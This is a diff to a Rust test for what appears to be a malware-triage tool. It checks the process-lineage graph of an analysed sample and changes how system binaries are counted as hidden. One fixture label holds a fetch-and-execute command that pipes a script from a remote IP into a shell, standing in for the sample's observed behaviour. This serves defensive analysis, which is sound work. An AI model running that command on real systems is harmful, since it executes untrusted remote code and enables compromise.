@@ -340,11 +340,9 @@ fn the_summary_adds_up_the_runs_triage_digests() {
     let graph = app.samples_page.detail_lineage().unwrap();
     let labels: Vec<&str> = graph.nodes.iter().map(|node| node.label.as_str()).collect();
     assert!(labels.contains(&".x") && labels.contains(&"$ curl -s http://198.51.100.7/p | sh"));
-    assert!(
-        !labels.contains(&"curl"),
-        "system binaries are hidden: {labels:?}"
-    );
-    assert_eq!(graph.hidden_system, 1);
+    // No base image is installed here, so no program has a hash the base
+    // image's manifest vouches for: nothing is hidden as a system binary.
+    assert_eq!(graph.hidden_system, 0, "{labels:?}");
     // The page draws with the sections present.
     for _ in 0..3 {
         render(&mut app, &ctx, SIZE);
